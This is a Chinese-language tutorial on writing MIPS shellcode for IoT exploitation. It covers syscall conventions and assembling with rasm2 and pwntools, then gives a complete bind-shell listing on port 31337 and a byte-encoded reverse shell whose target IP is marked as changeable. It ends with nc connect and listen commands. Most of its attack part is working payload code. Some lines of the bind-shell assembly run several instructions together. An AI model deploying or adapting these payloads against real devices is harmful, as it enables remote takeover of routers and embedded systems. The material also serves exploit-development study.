# mips shellcode编写

## 概述
在iot的利用过程中shellcode非常常用，网站上能找到一些shellcode，但是通常这些shellcode是需要自己进行一些修改的（比如对字符的过滤）。

这里贴出两个查找shellcode的链接

https://www.exploit-db.com/exploits/45541

http://shell-storm.org/shellcode/

## mips汇编特点

```bash
li $a0,1
li $v0,4001            // sys_exit
syscall 0x40404
```
- 使用v0寄存器作为调用号
- 使用a0 a1 a2来传参
- 系统调用返回值给v0
- li 是汇编伪指令一般被解释为addiu $dst, 0, imm
- \$zer0和\$0都表示立即数零

## 工具使用

### rasm2



```bash
➜  rasm2 -a mips -b 32 -e -C  "addiu a0,zero,1"
"\x24\x04\x00\x01"
```
-a 指定cpu架构（arch）

-b 指定机器位数（bit）

-e 指定为大段字节序（不加为小端）（endian）

-C 输出为c语言格式


反汇编不知道c语言的形式要怎么处理
```bash
➜  rasm2 -a mips -b 32 -e -d  "24040001"   
addiu a0, zero, 1
```

```
➜  cat test.asm 
addiu a0,zero,0;
addiu v0,zero,4001 //aaa          
syscall 0x40404
➜  rasm2 -a mips  -b 32 -e  -C -f ./test.asm
"\x24\x04\x00\x00\x24\x02\x0f\xa1\x00\x00\x00\x0c"
```
这东西可以跳过//和;  但是寄存器前面不能加$


### pwntools

设置环境
```python
from pwn import *
context(arch='mips',os='linux',endian='big',word_size=32)
```

汇编与反汇编
https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/asm.html

```

>>> asm("sw $zero, -4($sp)\n addiu $sp, $sp, -4")
"\xaf\xa0\xff\xfc'\xbd\xff\xfc"

>>> asm("sw $zero, -4($sp)\n addiu $sp, $sp, -4").encode("hex")
'afa0fffc27bdfffc'
>>> asm("sw $zero, -4($sp); addiu $sp, $sp, -4").encode("hex")
'afa0fffc27bdfffc'


>>> print disasm("afa0fffc27bdfffc".decode("hex"))
   0:   afa0fffc        sw      zero, -4(sp)
   4:   27bdfffc        addiu   sp, sp, -4
```
除了编译和反编译pwntools还提供了自动生成shellcode，自动生成汇编语句


```python
move
>>> print shellcraft.mips.mov('$t0', 0).rstrip()
    slti $t0, $zero, 0xFFFF /* $t0 = 0 */
    
    
pwnlib.shellcraft.mips.nop() 生成nop指令

pwnlib.shellcraft.mips.push(value)  把数据放入栈

pwnlib.shellcraft.mips.pushstr(string, append_null=True)  把字符串放入栈

>>> print shellcraft.setregs({'$t0':1, '$a3':'0'}).rstrip()   同时设置多个寄存器
    slti $a3, $zero, 0xFFFF /* $a3 = 0 */
    li $t9, ~1
    not $t0, $t9


shellcraft.mips.linux.bindsh(31337, "ipv4")   监听端口31337 ，网络是ipv4



```

个人比较喜欢pwntools，很多汇编指令都可以编译和反编译





## 汇编指令解析

```c
#include <stdlib.h>

int main(){
    execve("/bin/sh",0,0);
return 0;
}

```
被编译为


```c
lui $t6,0x2f62  
ori $t6,$t6,0x696e
sw $t6,28($sp)                        // 将 "/bin" 存入 $sp+28 的栈空间

lui $t7,0x2f2f
ori $t7,$t7,0x7368
sw $t7,32($sp)                        // 将 "//sh" 存入 $sp+28 的栈空间
sw $zero,36($sp)                  // 0 截段


la $a0,28($sp)                        // a0 寄存器指向 "/bin//sh" 栈空间

addiu $a1,$zero,0
addiu $a2,$zero,0
addiu $v0,$zero,4011            // execve 的系统调用号为 4011

syscall 0x40404                        // 调用 execve("/bin/sh",0,0);
```
- mips只能放入16位立即数（尽管是32位寄存器）所以在存入/bin字符串的时候先用lui把`/b`加载到寄存器高16位，用ori指令存入低16位
- 接下来的数据存放到栈地址更高处 sp+28  /bin  sp+32  //sh
- sw $zero,36($sp)  放0截断
- 用la $a0,28($sp)  获取
- a0，a1，a2用来传参。 v0用来存放系统调用号

## shellcode编写实例

等待用户远程的连接

```
###### sys_socket ######  sockfd = socket(AF_INET, SOCK_STREAM, 0)
addiu  $sp, $sp, -32
li               $t6, -3
nor          $a0, $t6, $zero
nor          $a1, $t6, $zero
slti           $a2, $0, -1       #用这种方式给寄存器赋值0
li               $v0, 4183
syscall 0x40404##### sys_bind ####

    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(_INT_PORT);
    my_addr.sin_addr.s_addr = inet_addr("132.241.5.10");
    bind(sockfd, (struct sockaddr *)&my_addr,sizeof(struct sockaddr_in))



add          $t9, $t9, 0x4444                #nop
andi        $s0, $v0, 0xffff
li               $t6, -17                  nor          $t6, $t6, $zero
li               $t5, 0x7a69         #port 31337        li               $t7,  -513
nor          $t7, $t7, $zero
sllv           $t7, $t7, $t6
or             $t5, $t5, $t7       sw            $t5, -32($sp)       sw     $zero,-28($sp)
sw     $zero,-24($sp)
sw     $zero,-20($sp)
or             $a0, $s0, $s0
li               $t6, -17                  nor          $a2, $t6, $zero
addi   $a1, $sp, -32
li               $v0, 4169
syscall 0x40404##### listen #####
li      $t7,0x7350
or      $a0,$s0,$s0
li      $a1,257
li      $v0,4174
syscall 0x40404##### accept #####
li      $t7,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,-1
slti    $a2,$zero,-1
li      $v0,4168
syscall  0x40404##### dup fd’s ####
li      $t7,0x7350
andi    $s0,$v0,0xffff
or      $a0,$s0,$s0
li      $t7,-3
nor     $a1,$t7,$zero
li      $v0,4063
syscall 0x40404
li      $t7,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,0x0101
li      $v0,4063
syscall 0x40404
li      $t7,0x7350
or      $a0,$s0,$s0
slti    $a1,$zero,-1
li      $v0,4063
syscall 0x40404######execve######
lui   $t7,0x2f2f
ori   $t7,$t7,0x6269
sw    $t7,-20($sp)
lui   $t6,0x6e2f
ori   $t6,$t6,0x7368
sw    $t6,-16($sp)
sw    $zero,-12($sp)
addiu $a0,$sp,-20
sw    $a0,-8($sp)
sw    $zero,-4($sp)
addiu $a1,$sp,-8
li    $v0,4011
syscall 0x40404#### sleep #####
li $v0, 4166
li $t7, 0x0368
addi $t7, $t7, -0x0304
sw $t7, -0x0402($sp)
sw $t7, -0x0406($sp)
la $a0, -0x0406($sp)
syscall 0x40404
addi $t4, $t4, 4444
```
最后要有一个sleep，不然进程就会被杀掉了
用nc 192.168.0.1 31337 进行连接


```
         "\x24\x0f\xff\xfd"        // li      t7,-3
         "\x01\xe0\x20\x27"        // nor     a0,t7,zero
         "\x01\xe0\x28\x27"        // nor     a1,t7,zero
         "\x28\x06\xff\xff"        // slti    a2,zero,-1
         "\x24\x02\x10\x57"        // li      v0,4183 ( sys_socket )
         "\x01\x01\x01\x0c"        // syscall 0x40404   //创建套接字
         "\xaf\xa2\xff\xff"        // sw      v0,-1(sp)  //v0存放返回地址
         "\x8f\xa4\xff\xff"        // lw      a0,-1(sp)  //第一个参数
         "\x24\x0f\xff\xfd"        // li      t7,-3 ( sa_family = AF_INET )
         "\x01\xe0\x78\x27"        // nor     t7,t7,zero   
         "\xaf\xaf\xff\xe0"        // sw      t7,-32(sp) 
         "\x3c\x0e\x7a\x69"        // lui     t6,0x7a69 ( sin_port = 0x7a69 )
         "\x35\xce\x7a\x69"        // ori     t6,t6,0x7a69
         "\xaf\xae\xff\xe4"        // sw      t6,-28(sp)
      /* ====================  You can change ip here ;) ====================== */
         "\x3c\x0d\xc0\xa8"        // lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ... 
         "\x35\xad\x01\x64"        // ori     t5,t5,0x164           ...0164 )
      /* ====================================================================== */
         "\xaf\xad\xff\xe6"        // sw      t5,-26(sp)
         "\x23\xa5\xff\xe2"        // addi    a1,sp,-30
         "\x24\x0c\xff\xef"        // li      t4,-17 ( addrlen = 16 )     
         "\x01\x80\x30\x27"        // nor     a2,t4,zero 
         "\x24\x02\x10\x4a"        // li      v0,4170 ( sys_connect ) 
         "\x01\x01\x01\x0c"        // syscall 0x40404
         "\x24\x0f\xff\xfd"        // li      t7,-3
         "\x01\xe0\x28\x27"        // nor     a1,t7,zero
         "\x8f\xa4\xff\xff"        // lw      a0,-1(sp)
//dup2_loop:
         "\x24\x02\x0f\xdf"        // li      v0,4063 ( sys_dup2 )
         "\x01\x01\x01\x0c"        // syscall 0x40404
         "\x20\xa5\xff\xff"        // addi    a1,a1,-1
         "\x24\x01\xff\xff"        // li      at,-1
         "\x14\xa1\xff\xfb"        // bne     a1,at, dup2_loop
         "\x28\x06\xff\xff"        // slti    a2,zero,-1
         "\x3c\x0f\x2f\x2f"        // lui     t7,0x2f2f
         "\x35\xef\x62\x69"        // ori     t7,t7,0x6269
         "\xaf\xaf\xff\xf4"        // sw      t7,-12(sp)
         "\x3c\x0e\x6e\x2f"        // lui     t6,0x6e2f
         "\x35\xce\x73\x68"        // ori     t6,t6,0x7368
         "\xaf\xae\xff\xf8"        // sw      t6,-8(sp)
         "\xaf\xa0\xff\xfc"        // sw      zero,-4(sp)
         "\x27\xa4\xff\xf4"        // addiu   a0,sp,-12
         "\x28\x05\xff\xff"        // slti    a1,zero,-1
         "\x24\x02\x0f\xab"        // li      v0,4011 ( sys_execve )
         "\x01\x01\x01\x0c";       // syscall 0x40404
exp
```
创建socker，反弹shell
用nc -lvvp 

## 工具推荐

pwnlib库 https://docs.pwntools.com/en/stable/shellcraft/mips.html








Rizzo
https://github.com/H4lo/IDA7-Rizzo
https://www.anquanke.com/post/id/199112#h2-16